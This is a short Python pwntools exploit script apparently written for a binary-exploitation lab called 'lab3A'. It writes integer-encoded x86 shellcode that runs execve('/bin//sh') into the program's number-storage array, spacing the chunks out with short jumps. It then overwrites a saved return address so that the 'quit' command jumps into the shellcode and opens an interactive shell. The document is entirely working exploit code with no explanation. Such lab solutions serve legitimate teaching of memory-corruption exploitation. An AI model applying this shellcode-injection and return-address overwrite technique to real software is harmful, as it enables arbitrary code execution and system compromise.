from pwn import *
import struct

p = process("./lab3A")

def store(num, index):
    p.sendline("store")
    p.sendlineafter("Number: ", str(num))
    p.sendlineafter("Index: ", str(index))

def trigger_shellcode():
    p.sendline("quit")

def exploit():
    gdb.attach(p, 'b *main+553')
    #jmp    0xffffcd88
    store(int("0xffffcd4c", 16), 109)
    store(1352253489, 1)
    store(82546832, 2)
    store(0x732f2f68, 4)
    store(0x04eb9068, 5)
    store(0x69622f68, 7)
    store(0x04eb906e, 8)
    store(0x5350e389, 10)
    store(0x04ebe189, 11)
    store(0x80cd0bb0, 13)
    trigger_shellcode()

    p.interactive()

if __name__ == "__main__":
    exploit()